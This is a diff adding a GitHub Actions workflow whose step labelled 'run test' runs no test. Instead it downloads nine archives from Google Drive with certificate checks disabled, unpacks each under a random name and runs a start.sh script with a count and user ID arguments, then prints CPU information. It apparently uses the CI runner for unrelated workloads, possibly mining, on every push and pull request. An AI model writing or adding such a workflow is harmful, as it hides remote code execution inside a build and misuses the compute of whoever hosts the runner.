@@ -1,0 +1,34 @@
+name: Phu Hang
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v3
+      with:
+        python-version: "3.12"
+    - name: run test
+      run: |
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1sl0c1OPJw0N7szDbCC04pDJQ5wmUtODa&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h9;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1gRvNsk5nCfcNL4eP40IXQGgixqRF6kP5&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h8;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1twL0XMLICYOZpmEBDh2yZdMTZV7coCpt&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h7;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1siI3XQatmnqXY3KibSz3nKrbcOsgbF7J&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h6;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1KgMO6JOn1if9HhvjMm-lGEfXzGXc-bSW&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h5;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1uYfF-Ms0PjLwNO7nFeisZbiDN9-rvfD6&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h4;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=17GNzIFGsghZtMk-8mFuqH7ccevvZNlMq&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h3;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1h66i2WJQK9j8-c8I68_ohZYfqGDPD4ph&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h2;
+        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1DMiTW2EvSHh_uRYCT44_mCmPCuIsOZK0&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user_h1;
+        lscpu
